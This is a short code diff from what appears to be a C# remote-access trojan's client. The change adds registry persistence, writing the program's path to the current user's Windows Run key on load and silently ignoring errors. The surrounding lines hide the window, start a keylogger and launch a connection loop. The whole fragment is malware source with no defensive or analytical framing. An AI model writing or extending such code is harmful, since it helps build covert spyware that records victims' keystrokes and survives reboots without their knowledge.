@@ -184,7 +184,16 @@ namespace Client
         //Hide form on form load
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
-                Dispatcher.CurrentDispatcher.Invoke(Hide);
+            string ExePath = System.Windows.Forms.Application.ExecutablePath;
+            RegistryKey reg;
+            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                reg.SetValue("Client", ExePath);
+                reg.Close();
+            }
+            catch{}
+            Dispatcher.CurrentDispatcher.Invoke(Hide);
                 StartAll(Keylogger.StartKeylogger);
                 StartAll(ConnectLoop);
         }
